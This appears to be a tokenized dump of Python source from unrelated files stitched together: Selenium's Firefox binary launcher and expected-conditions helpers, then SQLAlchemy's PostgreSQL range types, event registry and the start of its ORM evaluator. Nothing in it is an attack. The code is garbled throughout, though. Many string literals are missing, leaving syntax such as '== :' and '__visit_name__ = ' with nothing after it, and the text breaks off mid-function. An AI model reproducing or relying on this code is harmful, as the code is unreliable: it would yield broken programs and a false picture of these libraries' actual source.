~~~ """\n        Creates a new instance of Firefox binary.\n\n        :Args:\n         - firefox_path - Path to the Firefox executable. By default, it will be detected from the standard locations.\n         - log_file - A file object to redirect the firefox process output to. It can be sys.stdout.\n                      Please note that with parallel run the output won\'t be synchronous.\n                      By default, it will be redirected to /dev/null.\n        """ \n 
self . _start_cmd = firefox_path \n 
# We used to default to subprocess.PIPE instead of /dev/null, but after \n 
# a while the pipe would fill up and Firefox would freeze. \n 
self . _log_file = log_file or open ( os . devnull , "wb" ) \n 
self . command_line = None \n 
if self . _start_cmd is None : \n 
~~~ self . _start_cmd = self . _get_firefox_start_cmd ( ) \n 
~~ if not self . _start_cmd . strip ( ) : \n 
~~~ raise Exception ( "Failed to find firefox binary. You can set it by specifying the path to \'firefox_binary\':\\n\\nfrom selenium.webdriver.firefox.firefox_binary import FirefoxBinary\\n\\n" "binary = FirefoxBinary(\'/path/to/binary\')\\ndriver = webdriver.Firefox(firefox_binary=binary)" # Rather than modifying the environment of the calling Python process \n 
# copy it and modify as needed. \n 
~~ self . _firefox_env = os . environ . copy ( ) \n 
self . _firefox_env [ "MOZ_CRASHREPORTER_DISABLE" ] = "1" \n 
self . _firefox_env [ "MOZ_NO_REMOTE" ] = "1" \n 
self . _firefox_env [ "NO_EM_RESTART" ] = "1" \n 
\n 
~~ def add_command_line_options ( self , * args ) : \n 
~~~ self . command_line = args \n 
\n 
~~ def launch_browser ( self , profile ) : \n 
~~~ """Launches the browser for the given profile name.\n        It is assumed the profile already exists.\n        """ \n 
self . profile = profile \n 
\n 
self . _start_from_profile_path ( self . profile . path ) \n 
self . _wait_until_connectable ( ) \n 
\n 
~~ def kill ( self ) : \n 
~~~ """Kill the browser.\n\n        This is useful when the browser is stuck.\n        """ \n 
if self . process : \n 
~~~ self . process . kill ( ) \n 
self . process . wait ( ) \n 
\n 
~~ ~~ def _start_from_profile_path ( self , path ) : \n 
~~~ self . _firefox_env [ "XRE_PROFILE_PATH" ] = path \n 
\n 
if platform . system ( ) . lower ( ) == : \n 
~~~ self . _modify_link_library_path ( ) \n 
~~ command = [ self . _start_cmd , "-silent" ] \n 
if self . command_line is not None : \n 
~~~ for cli in self . command_line : \n 
~~~ command . append ( cli ) \n 
\n 
~~ ~~ Popen ( command , stdout = self . _log_file , stderr = STDOUT , \n 
env = self . _firefox_env ) . communicate ( ) \n 
command [ 1 ] = \n 
self . process = Popen ( \n 
command , stdout = self . _log_file , stderr = STDOUT , \n 
env = self . _firefox_env ) \n 
\n 
~~ def _wait_until_connectable ( self ) : \n 
~~~ """Blocks until the extension is connectable in the firefox.""" \n 
count = 0 \n 
while not utils . is_connectable ( self . profile . port ) : \n 
~~~ if self . process . poll ( ) is not None : \n 
# Browser has exited \n 
~~~ raise WebDriverException ( "The browser appears to have exited " \n 
"before we could connect. If you specified a log_file in " \n 
"the FirefoxBinary constructor, check it for details." ) \n 
~~ if count == 30 : \n 
~~~ self . kill ( ) \n 
raise WebDriverException ( "Can\'t load the profile. Profile " \n 
"Dir: %s If you specified a log_file in the " \n 
"FirefoxBinary constructor, check it for details." ) \n 
~~ count += 1 \n 
time . sleep ( 1 ) \n 
~~ return True \n 
\n 
~~ def _find_exe_in_registry ( self ) : \n 
~~~ try : \n 
~~~ from _winreg import OpenKey , QueryValue , HKEY_LOCAL_MACHINE , HKEY_CURRENT_USER \n 
~~ except ImportError : \n 
~~~ from winreg import OpenKey , QueryValue , HKEY_LOCAL_MACHINE , HKEY_CURRENT_USER \n 
~~ import shlex \n 
keys = ( \n 
r"SOFTWARE\\Classes\\FirefoxHTML\\shell\\open\\command" , \n 
r"SOFTWARE\\Classes\\Applications\\firefox.exe\\shell\\open\\command" \n 
) \n 
command = "" \n 
for path in keys : \n 
~~~ try : \n 
~~~ key = OpenKey ( HKEY_LOCAL_MACHINE , path ) \n 
command = QueryValue ( key , "" ) \n 
break \n 
~~ except OSError : \n 
~~~ try : \n 
~~~ key = OpenKey ( HKEY_CURRENT_USER , path ) \n 
command = QueryValue ( key , "" ) \n 
break \n 
~~ except OSError : \n 
~~~ pass \n 
~~ ~~ ~~ else : \n 
~~~ return "" \n 
\n 
~~ if not command : \n 
~~~ return "" \n 
\n 
~~ return shlex . split ( command ) [ 0 ] \n 
\n 
~~ def _get_firefox_start_cmd ( self ) : \n 
~~~ """Return the command to start firefox.""" \n 
start_cmd = "" \n 
if platform . system ( ) == "Darwin" : \n 
~~~ start_cmd = ( "/Applications/Firefox.app/Contents/MacOS/firefox-bin" ) \n 
~~ elif platform . system ( ) == "Windows" : \n 
~~~ start_cmd = ( self . _find_exe_in_registry ( ) or \n 
self . _default_windows_location ( ) ) \n 
~~ elif platform . system ( ) == and os . _name == : \n 
~~~ start_cmd = self . _default_windows_location ( ) \n 
~~ else : \n 
~~~ for ffname in [ "firefox" , "iceweasel" ] : \n 
~~~ start_cmd = self . which ( ffname ) \n 
if start_cmd is not None : \n 
~~~ break \n 
~~ ~~ else : \n 
\n 
~~~ raise RuntimeError ( "Could not find firefox in your system PATH." + \n 
" Please specify the firefox binary location or install firefox" ) \n 
~~ ~~ return start_cmd \n 
\n 
~~ def _default_windows_location ( self ) : \n 
~~~ program_files = [ os . getenv ( "PROGRAMFILES" , r"C:\\Program Files" ) , \n 
os . getenv ( "PROGRAMFILES(X86)" , r"C:\\Program Files (x86)" ) ] \n 
for path in program_files : \n 
~~~ binary_path = os . path . join ( path , r"Mozilla Firefox\\firefox.exe" ) \n 
if os . access ( binary_path , os . X_OK ) : \n 
~~~ return binary_path \n 
~~ ~~ return "" \n 
\n 
~~ def _modify_link_library_path ( self ) : \n 
~~~ existing_ld_lib_path = os . environ . get ( , ) \n 
\n 
new_ld_lib_path = self . _extract_and_check ( \n 
self . profile , self . NO_FOCUS_LIBRARY_NAME , "x86" , "amd64" ) \n 
\n 
new_ld_lib_path += existing_ld_lib_path \n 
\n 
self . _firefox_env [ "LD_LIBRARY_PATH" ] = new_ld_lib_path \n 
self . _firefox_env [ ] = self . NO_FOCUS_LIBRARY_NAME \n 
\n 
~~ def _extract_and_check ( self , profile , no_focus_so_name , x86 , amd64 ) : \n 
\n 
~~~ paths = [ x86 , amd64 ] \n 
built_path = "" \n 
for path in paths : \n 
~~~ library_path = os . path . join ( profile . path , path ) \n 
os . makedirs ( library_path ) \n 
import shutil \n 
shutil . copy ( os . path . join ( os . path . dirname ( __file__ ) , path , \n 
self . NO_FOCUS_LIBRARY_NAME ) , \n 
library_path ) \n 
built_path += library_path + ":" \n 
\n 
~~ return built_path \n 
\n 
~~ def which ( self , fname ) : \n 
~~~ """Returns the fully qualified path by searching Path of the given \n        name""" \n 
for pe in os . environ [ ] . split ( os . pathsep ) : \n 
~~~ checkname = os . path . join ( pe , fname ) \n 
if os . access ( checkname , os . X_OK ) and not os . path . isdir ( checkname ) : \n 
~~~ return checkname \n 
~~ ~~ return None \n 
# \n 
# Copyright 2012 WebDriver committers \n 
# Copyright 2012 Software Freedom Conservancy. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#      http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ ~~ from selenium . common . exceptions import NoSuchElementException \n 
from selenium . common . exceptions import NoSuchFrameException \n 
from selenium . common . exceptions import StaleElementReferenceException \n 
from selenium . common . exceptions import WebDriverException \n 
from selenium . common . exceptions import NoAlertPresentException \n 
\n 
"""\n * Canned "Expected Conditions" which are generally useful within webdriver\n * tests.\n""" \n 
class title_is ( object ) : \n 
~~~ """An expectation for checking the title of a page.\n    title is the expected title, which must be an exact match\n    returns True if the title matches, false otherwise.""" \n 
def __init__ ( self , title ) : \n 
~~~ self . title = title \n 
\n 
~~ def __call__ ( self , driver ) : \n 
~~~ return self . title == driver . title \n 
\n 
~~ ~~ class title_contains ( object ) : \n 
~~~ """ An expectation for checking that the title contains a case-sensitive\n    substring. title is the fragment of title expected\n    returns True when the title matches, False otherwise\n    """ \n 
def __init__ ( self , title ) : \n 
~~~ self . title = title \n 
\n 
~~ def __call__ ( self , driver ) : \n 
~~~ return self . title in driver . title \n 
\n 
~~ ~~ class presence_of_element_located ( object ) : \n 
~~~ """ An expectation for checking that an element is present on the DOM\n    of a page. This does not necessarily mean that the element is visible.\n    locator - used to find the element\n    returns the WebElement once it is located\n    """ \n 
def __init__ ( self , locator ) : \n 
~~~ self . locator = locator \n 
\n 
~~ def __call__ ( self , driver ) : \n 
~~~ return _find_element ( driver , self . locator ) \n 
\n 
~~ ~~ class visibility_of_element_located ( object ) : \n 
~~~ """ An expectation for checking that an element is present on the DOM of a\n    page and visible. Visibility means that the element is not only displayed\n    but also has a height and width that is greater than 0.\n    locator - used to find the element\n    returns the WebElement once it is located and visible\n    """ \n 
def __init__ ( self , locator ) : \n 
~~~ self . locator = locator \n 
\n 
~~ def __call__ ( self , driver ) : \n 
~~~ try : \n 
~~~ return _element_if_visible ( _find_element ( driver , self . locator ) ) \n 
~~ except StaleElementReferenceException : \n 
~~~ return False \n 
\n 
~~ ~~ ~~ class visibility_of ( object ) : \n 
~~~ """ An expectation for checking that an element, known to be present on the\n    DOM of a page, is visible. Visibility means that the element is not only\n    displayed but also has a height and width that is greater than 0.\n    element is the WebElement\n    returns the (same) WebElement once it is visible\n    """ \n 
def __init__ ( self , element ) : \n 
~~~ self . element = element \n 
\n 
~~ def __call__ ( self , ignored ) : \n 
~~~ return _element_if_visible ( self . element ) \n 
\n 
~~ ~~ def _element_if_visible ( element ) : \n 
~~~ return element if element . is_displayed ( ) else False \n 
\n 
~~ class presence_of_all_elements_located ( object ) : \n 
~~~ """ An expectation for checking that there is at least one element present\n    on a web page.\n    locator is used to find the element\n    returns the list of WebElements once they are located\n    """ \n 
def __init__ ( self , locator ) : \n 
~~~ self . locator = locator \n 
\n 
~~ def __call__ ( self , driver ) : \n 
~~~ return _find_elements ( driver , self . locator ) \n 
\n 
~~ ~~ class text_to_be_present_in_element ( object ) : \n 
~~~ """ An expectation for checking if the given text is present in the\n    specified element.\n    locator, text\n    """ \n 
def __init__ ( self , locator , text_ ) : \n 
~~~ self . locator = locator \n 
self . text = text_ \n 
\n 
~~ def __call__ ( self , driver ) : \n 
~~~ try : \n 
~~~ element_text = _find_element ( driver , self . locator ) . text \n 
return self . text in element_text \n 
~~ except StaleElementReferenceException : \n 
~~~ return False \n 
\n 
~~ ~~ ~~ class text_to_be_present_in_element_value ( object ) : \n 
~~~ """\n    An expectation for checking if the given text is present in the element\'s\n    locator, text\n    """ \n 
def __init__ ( self , locator , text_ ) : \n 
~~~ self . locator = locator \n 
self . text = text_ \n 
\n 
~~ def __call__ ( self , driver ) : \n 
~~~ try : \n 
~~~ element_text = _find_element ( driver , \n 
self . locator ) . get_attribute ( "value" ) \n 
if element_text : \n 
~~~ return self . text in element_text \n 
~~ else : \n 
~~~ return False \n 
~~ ~~ except StaleElementReferenceException : \n 
~~~ return False \n 
\n 
~~ ~~ ~~ class frame_to_be_available_and_switch_to_it ( object ) : \n 
~~~ """ An expectation for checking whether the given frame is available to\n    switch to.  If the frame is available it switches the given driver to the\n    specified frame.\n    """ \n 
def __init__ ( self , locator ) : \n 
~~~ self . frame_locator = locator \n 
\n 
~~ def __call__ ( self , driver ) : \n 
~~~ try : \n 
~~~ if isinstance ( self . frame_locator , tuple ) : \n 
~~~ driver . switch_to . frame ( _find_element ( driver , \n 
self . frame_locator ) ) \n 
~~ else : \n 
~~~ driver . switch_to . frame ( self . frame_locator ) \n 
~~ return True \n 
~~ except NoSuchFrameException : \n 
~~~ return False \n 
\n 
~~ ~~ ~~ class invisibility_of_element_located ( object ) : \n 
~~~ """ An Expectation for checking that an element is either invisible or not\n    present on the DOM.\n\n    locator used to find the element\n    """ \n 
def __init__ ( self , locator ) : \n 
~~~ self . locator = locator \n 
\n 
~~ def __call__ ( self , driver ) : \n 
~~~ try : \n 
~~~ return not _find_element ( driver , self . locator ) . is_displayed ( ) \n 
~~ except ( NoSuchElementException , StaleElementReferenceException ) : \n 
# In the case of NoSuchElement, returns true because the element is \n 
# not present in DOM. The try block checks if the element is present \n 
# but is invisible. \n 
# In the case of StaleElementReference, returns true because stale \n 
# element reference implies that element is no longer visible. \n 
~~~ return True \n 
\n 
~~ ~~ ~~ class element_to_be_clickable ( object ) : \n 
~~~ """ An Expectation for checking an element is visible and enabled such that\n    you can click it.""" \n 
def __init__ ( self , locator ) : \n 
~~~ self . locator = locator \n 
\n 
~~ def __call__ ( self , driver ) : \n 
~~~ element = visibility_of_element_located ( self . locator ) ( driver ) \n 
if element and element . is_enabled ( ) : \n 
~~~ return element \n 
~~ else : \n 
~~~ return False \n 
\n 
~~ ~~ ~~ class staleness_of ( object ) : \n 
~~~ """ Wait until an element is no longer attached to the DOM.\n    element is the element to wait for.\n    returns False if the element is still attached to the DOM, true otherwise.\n    """ \n 
def __init__ ( self , element ) : \n 
~~~ self . element = element \n 
\n 
~~ def __call__ ( self , ignored ) : \n 
~~~ try : \n 
# Calling any method forces a staleness check \n 
~~~ self . element . is_enabled ( ) \n 
return False \n 
~~ except StaleElementReferenceException as expected : \n 
~~~ return True \n 
\n 
~~ ~~ ~~ class element_to_be_selected ( object ) : \n 
~~~ """ An expectation for checking the selection is selected.\n    element is WebElement object\n    """ \n 
def __init__ ( self , element ) : \n 
~~~ self . element = element \n 
\n 
~~ def __call__ ( self , ignored ) : \n 
~~~ return self . element . is_selected ( ) \n 
\n 
~~ ~~ class element_located_to_be_selected ( object ) : \n 
~~~ """An expectation for the element to be located is selected.\n    locator is a tuple of (by, path)""" \n 
def __init__ ( self , locator ) : \n 
~~~ self . locator = locator \n 
\n 
~~ def __call__ ( self , driver ) : \n 
~~~ return _find_element ( driver , self . locator ) . is_selected ( ) \n 
\n 
~~ ~~ class element_selection_state_to_be ( object ) : \n 
~~~ """ An expectation for checking if the given element is selected.\n    element is WebElement object\n    is_selected is a Boolean."\n    """ \n 
def __init__ ( self , element , is_selected ) : \n 
~~~ self . element = element \n 
self . is_selected = is_selected \n 
\n 
~~ def __call__ ( self , ignored ) : \n 
~~~ return self . element . is_selected ( ) == self . is_selected \n 
\n 
~~ ~~ class element_located_selection_state_to_be ( object ) : \n 
~~~ """ An expectation to locate an element and check if the selection state\n    specified is in that state.\n    locator is a tuple of (by, path)\n    is_selected is a boolean\n    """ \n 
def __init__ ( self , locator , is_selected ) : \n 
~~~ self . locator = locator \n 
self . is_selected = is_selected \n 
\n 
~~ def __call__ ( self , driver ) : \n 
~~~ try : \n 
~~~ element = _find_element ( driver , self . locator ) \n 
return element . is_selected ( ) == self . is_selected \n 
~~ except StaleElementReferenceException : \n 
~~~ return False \n 
\n 
~~ ~~ ~~ class alert_is_present ( object ) : \n 
~~~ """ Expect an alert to be present.""" \n 
def __init__ ( self ) : \n 
~~~ pass \n 
\n 
~~ def __call__ ( self , driver ) : \n 
~~~ try : \n 
~~~ alert = driver . switch_to . alert \n 
alert . text \n 
return alert \n 
~~ except NoAlertPresentException : \n 
~~~ return False \n 
\n 
~~ ~~ ~~ def _find_element ( driver , by ) : \n 
~~~ """ Looks up an element. Logs and re-raises WebDriverException if thrown.\n    Method exists to gather data for\n    http://code.google.com/p/selenium/issues/detail?id=1800\n    """ \n 
try : \n 
~~~ return driver . find_element ( * by ) \n 
~~ except NoSuchElementException as e : \n 
~~~ raise e \n 
~~ except WebDriverException as e : \n 
~~~ raise e \n 
\n 
\n 
~~ ~~ def _find_elements ( driver , by ) : \n 
~~~ try : \n 
~~~ return driver . find_elements ( * by ) \n 
~~ except WebDriverException as e : \n 
~~~ raise e \n 
\n 
# Copyright (C) 2013-2015 the SQLAlchemy authors and contributors \n 
# <see AUTHORS file> \n 
# \n 
# This module is part of SQLAlchemy and is released under \n 
# the MIT License: http://www.opensource.org/licenses/mit-license.php \n 
\n 
~~ ~~ from . base import ischema_names \n 
from ... import types as sqltypes \n 
\n 
__all__ = ( , , ) \n 
\n 
\n 
class RangeOperators ( object ) : \n 
~~~ """\n    This mixin provides functionality for the Range Operators\n    listed in Table 9-44 of the `postgres documentation`__ for Range\n    Functions and Operators. It is used by all the range types\n    provided in the ``postgres`` dialect and can likely be used for\n    any range types you create yourself.\n\n    __ http://www.postgresql.org/docs/devel/static/functions-range.html\n\n    No extra support is provided for the Range Functions listed in\n    Table 9-45 of the postgres documentation. For these, the normal\n    :func:`~sqlalchemy.sql.expression.func` object should be used.\n\n    .. versionadded:: 0.8.2  Support for Postgresql RANGE operations.\n\n    """ \n 
\n 
class comparator_factory ( sqltypes . Concatenable . Comparator ) : \n 
~~~ """Define comparison operations for range types.""" \n 
\n 
def __ne__ ( self , other ) : \n 
~~~ "Boolean expression. Returns true if two ranges are not equal" \n 
return self . expr . op ( ) ( other ) \n 
\n 
~~ def contains ( self , other , ** kw ) : \n 
~~~ """Boolean expression. Returns true if the right hand operand,\n            which can be an element or a range, is contained within the\n            column.\n            """ \n 
return self . expr . op ( ) ( other ) \n 
\n 
~~ def contained_by ( self , other ) : \n 
~~~ """Boolean expression. Returns true if the column is contained\n            within the right hand operand.\n            """ \n 
return self . expr . op ( ) ( other ) \n 
\n 
~~ def overlaps ( self , other ) : \n 
~~~ """Boolean expression. Returns true if the column overlaps\n            (has points in common with) the right hand operand.\n            """ \n 
return self . expr . op ( ) ( other ) \n 
\n 
~~ def strictly_left_of ( self , other ) : \n 
~~~ """Boolean expression. Returns true if the column is strictly\n            left of the right hand operand.\n            """ \n 
return self . expr . op ( ) ( other ) \n 
\n 
~~ __lshift__ = strictly_left_of \n 
\n 
def strictly_right_of ( self , other ) : \n 
~~~ """Boolean expression. Returns true if the column is strictly\n            right of the right hand operand.\n            """ \n 
return self . expr . op ( ) ( other ) \n 
\n 
~~ __rshift__ = strictly_right_of \n 
\n 
def not_extend_right_of ( self , other ) : \n 
~~~ """Boolean expression. Returns true if the range in the column\n            does not extend right of the range in the operand.\n            """ \n 
return self . expr . op ( ) ( other ) \n 
\n 
~~ def not_extend_left_of ( self , other ) : \n 
~~~ """Boolean expression. Returns true if the range in the column\n            does not extend left of the range in the operand.\n            """ \n 
return self . expr . op ( ) ( other ) \n 
\n 
~~ def adjacent_to ( self , other ) : \n 
~~~ """Boolean expression. Returns true if the range in the column\n            is adjacent to the range in the operand.\n            """ \n 
return self . expr . op ( ) ( other ) \n 
\n 
~~ def __add__ ( self , other ) : \n 
~~~ """Range expression. Returns the union of the two ranges.\n            Will raise an exception if the resulting range is not\n            contigous.\n            """ \n 
return self . expr . op ( ) ( other ) \n 
\n 
\n 
~~ ~~ ~~ class INT4RANGE ( RangeOperators , sqltypes . TypeEngine ) : \n 
~~~ """Represent the Postgresql INT4RANGE type.\n\n    .. versionadded:: 0.8.2\n\n    """ \n 
\n 
__visit_name__ = \n 
\n 
~~ ischema_names [ ] = INT4RANGE \n 
\n 
\n 
class INT8RANGE ( RangeOperators , sqltypes . TypeEngine ) : \n 
~~~ """Represent the Postgresql INT8RANGE type.\n\n    .. versionadded:: 0.8.2\n\n    """ \n 
\n 
__visit_name__ = \n 
\n 
~~ ischema_names [ ] = INT8RANGE \n 
\n 
\n 
class NUMRANGE ( RangeOperators , sqltypes . TypeEngine ) : \n 
~~~ """Represent the Postgresql NUMRANGE type.\n\n    .. versionadded:: 0.8.2\n\n    """ \n 
\n 
__visit_name__ = \n 
\n 
~~ ischema_names [ ] = NUMRANGE \n 
\n 
\n 
class DATERANGE ( RangeOperators , sqltypes . TypeEngine ) : \n 
~~~ """Represent the Postgresql DATERANGE type.\n\n    .. versionadded:: 0.8.2\n\n    """ \n 
\n 
__visit_name__ = \n 
\n 
~~ ischema_names [ ] = DATERANGE \n 
\n 
\n 
class TSRANGE ( RangeOperators , sqltypes . TypeEngine ) : \n 
~~~ """Represent the Postgresql TSRANGE type.\n\n    .. versionadded:: 0.8.2\n\n    """ \n 
\n 
__visit_name__ = \n 
\n 
~~ ischema_names [ ] = TSRANGE \n 
\n 
\n 
class TSTZRANGE ( RangeOperators , sqltypes . TypeEngine ) : \n 
~~~ """Represent the Postgresql TSTZRANGE type.\n\n    .. versionadded:: 0.8.2\n\n    """ \n 
\n 
__visit_name__ = \n 
\n 
~~ ischema_names [ ] = TSTZRANGE \n 
# event/registry.py \n 
# Copyright (C) 2005-2015 the SQLAlchemy authors and contributors \n 
# <see AUTHORS file> \n 
# \n 
# This module is part of SQLAlchemy and is released under \n 
# the MIT License: http://www.opensource.org/licenses/mit-license.php \n 
\n 
"""Provides managed registration services on behalf of :func:`.listen`\narguments.\n\nBy "managed registration", we mean that event listening functions and\nother objects can be added to various collections in such a way that their\nmembership in all those collections can be revoked at once, based on\nan equivalent :class:`._EventKey`.\n\n""" \n 
\n 
from __future__ import absolute_import \n 
\n 
import weakref \n 
import collections \n 
import types \n 
from . . import exc , util \n 
\n 
\n 
_key_to_collection = collections . defaultdict ( dict ) \n 
"""\nGiven an original listen() argument, can locate all\nlistener collections and the listener fn contained\n\n(target, identifier, fn) -> {\n                            ref(listenercollection) -> ref(listener_fn)\n                            ref(listenercollection) -> ref(listener_fn)\n                            ref(listenercollection) -> ref(listener_fn)\n                        }\n""" \n 
\n 
_collection_to_key = collections . defaultdict ( dict ) \n 
"""\nGiven a _ListenerCollection or _DispatchDescriptor, can locate\nall the original listen() arguments and the listener fn contained\n\nref(listenercollection) -> {\n                            ref(listener_fn) -> (target, identifier, fn),\n                            ref(listener_fn) -> (target, identifier, fn),\n                            ref(listener_fn) -> (target, identifier, fn),\n                        }\n""" \n 
\n 
\n 
def _collection_gced ( ref ) : \n 
\n 
~~~ if not _collection_to_key or ref not in _collection_to_key : \n 
~~~ return \n 
~~ listener_to_key = _collection_to_key . pop ( ref ) \n 
for key in listener_to_key . values ( ) : \n 
~~~ if key in _key_to_collection : \n 
\n 
~~~ dispatch_reg = _key_to_collection [ key ] \n 
dispatch_reg . pop ( ref ) \n 
if not dispatch_reg : \n 
~~~ _key_to_collection . pop ( key ) \n 
\n 
\n 
~~ ~~ ~~ ~~ def _stored_in_collection ( event_key , owner ) : \n 
~~~ key = event_key . _key \n 
\n 
dispatch_reg = _key_to_collection [ key ] \n 
\n 
owner_ref = owner . ref \n 
listen_ref = weakref . ref ( event_key . _listen_fn ) \n 
\n 
if owner_ref in dispatch_reg : \n 
~~~ return False \n 
\n 
~~ dispatch_reg [ owner_ref ] = listen_ref \n 
\n 
listener_to_key = _collection_to_key [ owner_ref ] \n 
listener_to_key [ listen_ref ] = key \n 
\n 
return True \n 
\n 
\n 
~~ def _removed_from_collection ( event_key , owner ) : \n 
~~~ key = event_key . _key \n 
\n 
dispatch_reg = _key_to_collection [ key ] \n 
\n 
listen_ref = weakref . ref ( event_key . _listen_fn ) \n 
\n 
owner_ref = owner . ref \n 
dispatch_reg . pop ( owner_ref , None ) \n 
if not dispatch_reg : \n 
~~~ del _key_to_collection [ key ] \n 
\n 
~~ if owner_ref in _collection_to_key : \n 
~~~ listener_to_key = _collection_to_key [ owner_ref ] \n 
listener_to_key . pop ( listen_ref ) \n 
\n 
\n 
~~ ~~ def _stored_in_collection_multi ( newowner , oldowner , elements ) : \n 
~~~ if not elements : \n 
~~~ return \n 
\n 
~~ oldowner = oldowner . ref \n 
newowner = newowner . ref \n 
\n 
old_listener_to_key = _collection_to_key [ oldowner ] \n 
new_listener_to_key = _collection_to_key [ newowner ] \n 
\n 
for listen_fn in elements : \n 
~~~ listen_ref = weakref . ref ( listen_fn ) \n 
key = old_listener_to_key [ listen_ref ] \n 
dispatch_reg = _key_to_collection [ key ] \n 
if newowner in dispatch_reg : \n 
~~~ assert dispatch_reg [ newowner ] == listen_ref \n 
~~ else : \n 
~~~ dispatch_reg [ newowner ] = listen_ref \n 
\n 
~~ new_listener_to_key [ listen_ref ] = key \n 
\n 
\n 
~~ ~~ def _clear ( owner , elements ) : \n 
~~~ if not elements : \n 
~~~ return \n 
\n 
~~ owner = owner . ref \n 
listener_to_key = _collection_to_key [ owner ] \n 
for listen_fn in elements : \n 
~~~ listen_ref = weakref . ref ( listen_fn ) \n 
key = listener_to_key [ listen_ref ] \n 
dispatch_reg = _key_to_collection [ key ] \n 
dispatch_reg . pop ( owner , None ) \n 
\n 
if not dispatch_reg : \n 
~~~ del _key_to_collection [ key ] \n 
\n 
\n 
~~ ~~ ~~ class _EventKey ( object ) : \n 
~~~ """Represent :func:`.listen` arguments.\n    """ \n 
\n 
def __init__ ( self , target , identifier , \n 
fn , dispatch_target , _fn_wrap = None ) : \n 
~~~ self . target = target \n 
self . identifier = identifier \n 
self . fn = fn \n 
if isinstance ( fn , types . MethodType ) : \n 
~~~ self . fn_key = id ( fn . __func__ ) , id ( fn . __self__ ) \n 
~~ else : \n 
~~~ self . fn_key = id ( fn ) \n 
~~ self . fn_wrap = _fn_wrap \n 
self . dispatch_target = dispatch_target \n 
\n 
~~ @ property \n 
def _key ( self ) : \n 
~~~ return ( id ( self . target ) , self . identifier , self . fn_key ) \n 
\n 
~~ def with_wrapper ( self , fn_wrap ) : \n 
~~~ if fn_wrap is self . _listen_fn : \n 
~~~ return self \n 
~~ else : \n 
~~~ return _EventKey ( \n 
self . target , \n 
self . identifier , \n 
self . fn , \n 
self . dispatch_target , \n 
_fn_wrap = fn_wrap \n 
) \n 
\n 
~~ ~~ def with_dispatch_target ( self , dispatch_target ) : \n 
~~~ if dispatch_target is self . dispatch_target : \n 
~~~ return self \n 
~~ else : \n 
~~~ return _EventKey ( \n 
self . target , \n 
self . identifier , \n 
self . fn , \n 
dispatch_target , \n 
_fn_wrap = self . fn_wrap \n 
) \n 
\n 
~~ ~~ def listen ( self , * args , ** kw ) : \n 
~~~ once = kw . pop ( "once" , False ) \n 
named = kw . pop ( "named" , False ) \n 
\n 
target , identifier , fn = self . dispatch_target , self . identifier , self . _listen_fn \n 
\n 
dispatch_descriptor = getattr ( target . dispatch , identifier ) \n 
\n 
adjusted_fn = dispatch_descriptor . _adjust_fn_spec ( fn , named ) \n 
\n 
self = self . with_wrapper ( adjusted_fn ) \n 
\n 
if once : \n 
~~~ self . with_wrapper ( \n 
util . only_once ( self . _listen_fn ) ) . listen ( * args , ** kw ) \n 
~~ else : \n 
~~~ self . dispatch_target . dispatch . _listen ( self , * args , ** kw ) \n 
\n 
~~ ~~ def remove ( self ) : \n 
~~~ key = self . _key \n 
\n 
if key not in _key_to_collection : \n 
~~~ raise exc . InvalidRequestError ( \n 
"No listeners found for event %s / %r / %s " % \n 
( self . target , self . identifier , self . fn ) \n 
) \n 
~~ dispatch_reg = _key_to_collection . pop ( key ) \n 
\n 
for collection_ref , listener_ref in dispatch_reg . items ( ) : \n 
~~~ collection = collection_ref ( ) \n 
listener_fn = listener_ref ( ) \n 
if collection is not None and listener_fn is not None : \n 
~~~ collection . remove ( self . with_wrapper ( listener_fn ) ) \n 
\n 
~~ ~~ ~~ def contains ( self ) : \n 
~~~ """Return True if this event key is registered to listen.\n        """ \n 
return self . _key in _key_to_collection \n 
\n 
~~ def base_listen ( self , propagate = False , insert = False , \n 
named = False ) : \n 
\n 
~~~ target , identifier , fn = self . dispatch_target , self . identifier , self . _listen_fn \n 
\n 
dispatch_descriptor = getattr ( target . dispatch , identifier ) \n 
\n 
if insert : \n 
~~~ dispatch_descriptor . for_modify ( target . dispatch ) . insert ( self , propagate ) \n 
~~ else : \n 
~~~ dispatch_descriptor . for_modify ( target . dispatch ) . append ( self , propagate ) \n 
\n 
~~ ~~ @ property \n 
def _listen_fn ( self ) : \n 
~~~ return self . fn_wrap or self . fn \n 
\n 
~~ def append_to_list ( self , owner , list_ ) : \n 
~~~ if _stored_in_collection ( self , owner ) : \n 
~~~ list_ . append ( self . _listen_fn ) \n 
return True \n 
~~ else : \n 
~~~ return False \n 
\n 
~~ ~~ def remove_from_list ( self , owner , list_ ) : \n 
~~~ _removed_from_collection ( self , owner ) \n 
list_ . remove ( self . _listen_fn ) \n 
\n 
~~ def prepend_to_list ( self , owner , list_ ) : \n 
~~~ if _stored_in_collection ( self , owner ) : \n 
~~~ list_ . insert ( 0 , self . _listen_fn ) \n 
return True \n 
~~ else : \n 
~~~ return False \n 
# orm/evaluator.py \n 
# Copyright (C) 2005-2015 the SQLAlchemy authors and contributors \n 
# <see AUTHORS file> \n 
# \n 
# This module is part of SQLAlchemy and is released under \n 
# the MIT License: http://www.opensource.org/licenses/mit-license.php \n 
\n 
~~ ~~ ~~ import operator \n 
from . . sql import operators \n 
from . . import util \n 
\n 
\n 
class UnevaluatableError ( Exception ) : \n 
~~~ pass \n 
\n 
~~ _straight_ops = set ( getattr ( operators , op ) \n 
for op in ( , , , \n 
, \n 
, , \n 
, , , , , ) ) \n 
\n 
\n 
_notimplemented_ops = set ( getattr ( operators , op ) \n 
for op in ( , , , \n 
, , , \n 
, , ) ) \n 
\n 
\n 
class EvaluatorCompiler ( object ) : \n 
\n 
~~~ def __init__ ( self , target_cls = None ) : \n 
~~~ self . target_cls = target_cls \n 
\n 
~~ def process ( self , clause ) : \n 
~~~ meth = getattr ( self , "visit_%s" % clause . __visit_name__ , None ) \n 
if not meth : \n 
~~~ raise UnevaluatableError ( \n 
"Cannot evaluate %s" % type ( clause ) . __name__ ) \n 
~~ return meth ( clause ) \n 
\n 
~~ def visit_grouping ( self , clause ) : \n 
~~~ return self . process ( clause . element ) \n 
\n 
~~ def visit_null ( self , clause ) : \n 
~~~ return lambda obj : None \n 
\n 
~~ def visit_false ( self , clause ) : \n 
